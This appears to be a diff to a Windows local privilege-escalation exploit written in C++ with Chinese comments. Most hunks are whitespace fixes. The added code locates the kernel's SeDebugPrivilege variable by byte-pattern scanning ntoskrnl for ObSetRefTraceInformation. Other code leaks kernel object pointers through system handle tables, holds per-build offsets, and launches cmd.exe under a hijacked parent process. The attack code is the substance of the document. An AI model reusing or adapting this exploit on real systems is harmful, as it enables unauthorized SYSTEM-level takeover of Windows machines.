@@ -176,7 +176,7 @@ PVOID GetKernelPointerByHandle(HANDLE HandleValue, DWORD ProcPid)
     NTSTATUS status = (NTSTATUS)0xc0000004;  // STATUS_INFO_LENGTH_MISMATCH
     PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
 
-    do 
+    do
     {
         len *= 2;
         pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);
@@ -200,7 +200,7 @@ PVOID GetKernelPointerByHandle(HANDLE HandleValue, DWORD ProcPid)
         }
 
         // 在返回的句柄列表中搜索句柄
-        for (int i = 0; i < pHandleInfo->HandleCount; i++) 
+        for (int i = 0; i < pHandleInfo->HandleCount; i++)
         {
             PVOID object = pHandleInfo->Handles[i].Object;
             HANDLE handle = pHandleInfo->Handles[i].HandleValue;
@@ -227,7 +227,7 @@ ULONG GetPidByName(LPCWSTR ProcName)
     ULONG pid = 0;
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (Process32First(snapshot, &entry) == TRUE) {
-        while (Process32Next(snapshot, &entry) == TRUE) 
+        while (Process32Next(snapshot, &entry) == TRUE)
         {
             if (wcscmp(entry.szExeFile, ProcName) == 0) {
                 pid = entry.th32ProcessID;
@@ -331,14 +331,14 @@ DWORD64 GetKernelPointer(HANDLE handle, DWORD type, DWORD ProcPid)
     DWORD outBuffer = 0;
     NTSTATUS status = NtQuerySystemInformation(
         (SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, 0x20, &outBuffer);
-    if (status == STATUS_INFO_LENGTH_MISMATCH){
+    if (status == STATUS_INFO_LENGTH_MISMATCH) {
         free(buffer);
         buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(outBuffer);
         status = NtQuerySystemInformation(
             (SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, outBuffer, &outBuffer);
     }
 
-    if (!buffer){
+    if (!buffer) {
         ErrorStatusInfo("NtQuerySystemInformation error.", GetLastError());
         return 0;
     }
@@ -346,7 +346,7 @@ DWORD64 GetKernelPointer(HANDLE handle, DWORD type, DWORD ProcPid)
     for (size_t i = 0; i < buffer->NumberOfHandles; i++)
     {
         DWORD objTypeNumber = buffer->Handles[i].ObjectTypeNumber;
-        if (buffer->Handles[i].ProcessId == ProcPid 
+        if (buffer->Handles[i].ProcessId == ProcPid
             && buffer->Handles[i].ObjectTypeNumber == type)
         {
             // 添加以获取随机对象指针
@@ -358,7 +358,7 @@ DWORD64 GetKernelPointer(HANDLE handle, DWORD type, DWORD ProcPid)
                 return object;
             }
 
-            if (handle == (HANDLE)buffer->Handles[i].Handle){
+            if (handle == (HANDLE)buffer->Handles[i].Handle) {
                 DWORD64 object = (DWORD64)buffer->Handles[i].Object;
                 free(buffer);
                 return object;
@@ -410,7 +410,7 @@ DWORD64 GetFileObjKernelPointer(DWORD ProcPid)
     return 0;
 }
 
-// 通过 pattern 查找段
+// 通过 pattern 查找字节地址
 BOOL ScanSectionForPattern(HANDLE hProcess,
     LPVOID lpBaseAddress, SIZE_T dwSize, BYTE* pattern, SIZE_T patternSize, LPVOID* lpFoundAddress)
 {
@@ -426,10 +426,10 @@ BOOL ScanSectionForPattern(HANDLE hProcess,
         return FALSE;
     }
 
-    for (SIZE_T i = 0; i < dwSize - patternSize; i++) 
+    for (SIZE_T i = 0; i < dwSize - patternSize; i++)
     {
         BOOL found = TRUE;
-        for (SIZE_T j = 0; j < patternSize; j++) 
+        for (SIZE_T j = 0; j < patternSize; j++)
         {
             if (buffer[i + j] != pattern[j]) {
                 found = FALSE;
@@ -447,7 +447,7 @@ BOOL ScanSectionForPattern(HANDLE hProcess,
     return FALSE;
 }
 
-// 通过字节序列查找指定模块句柄的函数
+// 通过字节序列查找指定模块句柄的指令偏移
 UINT_PTR FindPattern(HMODULE hModule, BYTE* pattern, SIZE_T patternSize)
 {
     UINT_PTR relativeOffset = 0;
@@ -460,12 +460,12 @@ UINT_PTR FindPattern(HMODULE hModule, BYTE* pattern, SIZE_T patternSize)
 
     for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
     {
-        if (strcmp((CHAR*)pSectionHeader[i].Name, "PAGE") == 0){
+        if (strcmp((CHAR*)pSectionHeader[i].Name, "PAGE") == 0) {
             LPVOID lpSectionBaseAddress = (LPVOID)((LPBYTE)hModule + pSectionHeader[i].VirtualAddress);
             SIZE_T dwSectionSize = pSectionHeader[i].Misc.VirtualSize;
 
             if (ScanSectionForPattern(
-                GetCurrentProcess(), lpSectionBaseAddress, dwSectionSize, pattern, patternSize, &lpFoundAddress)){
+                GetCurrentProcess(), lpSectionBaseAddress, dwSectionSize, pattern, patternSize, &lpFoundAddress)) {
                 // 计算相对偏移量
                 relativeOffset = (UINT_PTR)lpFoundAddress - (UINT_PTR)hModule;
             }
@@ -477,10 +477,104 @@ UINT_PTR FindPattern(HMODULE hModule, BYTE* pattern, SIZE_T patternSize)
     return relativeOffset;
 }
 
+// 将传入的字节数组解析为一个 DWORD64 类型整数(小端序的字节顺序)
+// pattern: 指向输入字节数组的指针
+// offset: 偏移量，指定从数组的偏移开始处理
+// length: 字节数组的长度，最大长度8
+DWORD64 ConvertBytesToUInt64(const BYTE* pattern, size_t offset, size_t length)
+{
+    // 检查输入是否有效
+    if (!pattern || length == 0 || length > 8) {
+        printf("[-] Invalid input: pattern is null, length is zero, or exceeds 8.\n");
+        return 0;
+    }
+
+    DWORD64 result = 0;
+    // 遍历每个字节并按小端序拼接
+    for (SIZE_T i = 0; i < length; ++i) {
+        result |= static_cast<DWORD64>(pattern[offset + i]) << (i * 8);
+    }
+
+    return result;
+}
+
+// 通过 nto 句柄查找 SeDebugPrivilege 的偏移
+UINT_PTR FindSeDebugPrivilegeOffset(HMODULE hModule)
+{
+    // ObSetRefTraceInformation
+    BYTE pattern[] = {
+        0x48, 0x89, 0x5C, 0x24, 0x08,
+        0x48, 0x89, 0x74, 0x24, 0x10,
+        0x57,
+        0x48, 0x83, 0xEC, 0x30,
+        0x8B, 0xFA,
+        0x48, 0x8B, 0xD9
+    };
+    SIZE_T patternSize = sizeof(pattern);
+
+    UINT_PTR ObSetRefTraceInformationOffset = 0;
+    UINT_PTR ObSetRefTraceInformation = 0;
+    UINT_PTR SeDebugPrivilegeOffset = 0;
+
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
+    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + pDosHeader->e_lfanew);
+    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
+
+    LPVOID lpFoundAddress = NULL;
+
+    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
+    {
+        if (strcmp((CHAR*)pSectionHeader[i].Name, "PAGE") == 0) {
+            LPVOID lpSectionBaseAddress = (LPVOID)((LPBYTE)hModule + pSectionHeader[i].VirtualAddress);
+            SIZE_T dwSectionSize = pSectionHeader[i].Misc.VirtualSize;
+
+            if (ScanSectionForPattern(
+                GetCurrentProcess(), lpSectionBaseAddress, dwSectionSize, pattern, patternSize, &lpFoundAddress)) {
+                // 计算 ObSetRefTraceInformation 相对偏移量
+                ObSetRefTraceInformationOffset = (UINT_PTR)lpFoundAddress - (UINT_PTR)hModule;
+                ObSetRefTraceInformation = (UINT_PTR)lpFoundAddress;
+            }
+            break;
+        }
+    }
+
+    SIZE_T bytesRead = 0;
+    BYTE* buffer = (BYTE*)malloc(8);
+    if (buffer == NULL) {
+        return 0;
+    }
+
+    UINT_PTR MOV_RCX_SeDebugPrivilege = ObSetRefTraceInformation + 0x27;
+    ObSetRefTraceInformationOffset += 0x27;
+
+    if (!ReadProcessMemory(GetCurrentProcess(),
+        (LPCVOID)(MOV_RCX_SeDebugPrivilege), buffer, 1, &bytesRead)) {
+        ErrorStatusInfo("ReadProcessMemory failed with error.", GetLastError());
+        return 0;
+    }
+
+    if (buffer[0] != '\x48') {
+        MOV_RCX_SeDebugPrivilege += 5;
+        ObSetRefTraceInformationOffset += 5;
+    }
+
+    if (!ReadProcessMemory(GetCurrentProcess(),
+        (LPCVOID)MOV_RCX_SeDebugPrivilege, buffer, sizeof(buffer), &bytesRead)) {
+        ErrorStatusInfo("ReadProcessMemory failed with error.", GetLastError());
+        return 0;
+    }
+
+    // 从偏移 3 开始，取 4 个字节
+    SeDebugPrivilegeOffset = ConvertBytesToUInt64(buffer, 3, 4);
+    SeDebugPrivilegeOffset += ObSetRefTraceInformationOffset + 7;
+
+    return SeDebugPrivilegeOffset;
+}
+
 
 
 typedef LONG(WINAPI* RtlGetVersionFunc)(PRTL_OSVERSIONINFOW);
-// 从注册表中读取 UBR 修补版本
+// 从注册表中读取 Revision 修补版本
 DWORD GetOSRevisionNumber()
 {
     HKEY hKey;
@@ -696,7 +790,7 @@ DWORD CreateProcFromHandleCommand(HANDLE Handle, LPWSTR Command) {
         size
     );
     InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
-    UpdateProcThreadAttribute(si.lpAttributeList, 
+    UpdateProcThreadAttribute(si.lpAttributeList,
         0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &Handle, sizeof(HANDLE), NULL, NULL);
 
     si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
@@ -734,6 +828,7 @@ void CreateCmdProcFromHandle(HANDLE hProcess) {
     ZeroMemory(&si, sizeof(si));
     si.StartupInfo.cb = sizeof(si);
     si.lpAttributeList = NULL;
+    wchar_t cmd_process[] = L"C:\\Windows\\System32\\cmd.exe";
 
     PROCESS_INFORMATION pi;
     ZeroMemory(&pi, sizeof(pi));
@@ -783,15 +878,15 @@ void CreateCmdProcFromHandle(HANDLE hProcess) {
         }
 
         status = CreateProcessW(
-            NULL, 
-            (LPWSTR)wCmdPath, 
-            NULL, 
-            NULL, 
-            FALSE, 
-            EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, 
-            NULL, 
-            NULL, 
-            &si.StartupInfo, 
+            NULL,
+            (LPWSTR)cmd_process,//(LPWSTR)wCmdPath,
+            NULL,
+            NULL,
+            FALSE,
+            EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
+            NULL,
+            NULL,
+            &si.StartupInfo,
             &pi
         );
 
@@ -896,7 +991,7 @@ DWORD GetPagedataSectionBaseAddress(LPCWSTR filePath)
     PIMAGE_SECTION_HEADER pSectionHeaders = IMAGE_FIRST_SECTION(pNtHeaders);
 
     // 遍历节表寻找 PAGEDATA 节
-    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; ++i) 
+    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; ++i)
     {
         if (memcmp(pSectionHeaders[i].Name, "PAGEDATA", 8) == 0) {
             DWORD baseAddress = pSectionHeaders[i].VirtualAddress;
@@ -922,25 +1017,25 @@ void SetNtSeDebugPrivilegeOffsetByOSVersion(OSVERSION& OSVersion,
         case 17763: std::wcout << L"  Windows 10 1809 / Windows Server 2019" << std::endl;
             PAGEDATA_NtSeDebugPrivilege_Offset = WS19_PAGEDATA_NtSeDebugPrivilege_Offset;
             break;
-        case 10240: std::wcout << L"  Windows 10 1507" << std::endl; 
+        case 10240: std::wcout << L"  Windows 10 1507" << std::endl;
             break;
-        case 10586: std::wcout << L"  Windows 10 1511" << std::endl; 
+        case 10586: std::wcout << L"  Windows 10 1511" << std::endl;
             break;
-        case 15063: std::wcout << L"  Windows 10 1703" << std::endl; 
+        case 15063: std::wcout << L"  Windows 10 1703" << std::endl;
             break;
-        case 16299: std::wcout << L"  Windows 10 1709" << std::endl; 
+        case 16299: std::wcout << L"  Windows 10 1709" << std::endl;
             break;
-        case 17134: std::wcout << L"  Windows 10 1803" << std::endl; 
+        case 17134: std::wcout << L"  Windows 10 1803" << std::endl;
             break;
-        case 18362: std::wcout << L"  Windows 10 1903" << std::endl; 
+        case 18362: std::wcout << L"  Windows 10 1903" << std::endl;
             break;
-        case 18363: std::wcout << L"  Windows 10 1909" << std::endl; 
+        case 18363: std::wcout << L"  Windows 10 1909" << std::endl;
             break;
-        case 19041: std::wcout << L"  Windows 10 2004 / Windows Server 2004" << std::endl; 
+        case 19041: std::wcout << L"  Windows 10 2004 / Windows Server 2004" << std::endl;
             break;
-        case 19042: std::wcout << L"  Windows 10 20H2 / Windows Server 20H2" << std::endl; 
+        case 19042: std::wcout << L"  Windows 10 20H2 / Windows Server 20H2" << std::endl;
             break;
-        case 19043: std::wcout << L"  Windows 10 21H1 / Windows Server 21H1" << std::endl; 
+        case 19043: std::wcout << L"  Windows 10 21H1 / Windows Server 21H1" << std::endl;
             break;
         case 20348: std::wcout << L"  Windows Server 2022" << std::endl;
             switch (OSVersion.RevisionNumber) {
